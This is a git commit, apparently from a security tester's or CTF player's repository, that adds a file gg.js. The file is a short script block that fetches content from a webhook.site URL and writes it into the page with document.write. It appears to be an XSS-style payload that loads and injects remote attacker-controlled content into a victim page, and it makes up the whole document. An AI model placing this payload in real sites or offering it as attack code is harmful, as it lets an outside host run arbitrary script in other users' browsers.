a3e2b7a605e4edfcb2ffb0863f204d53738c8bb2
Oleksii <76210733+KernelKrise@users.noreply.github.com>
2023-02-17 20:12:43 +0200

    Create gg.js

---
+++ gg.js
@@ -0,0 +1,8 @@
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","https://webhook.site/122abac2-8abd-44ce-abeb-43976d2bdc91");
+x.send();
+</script>
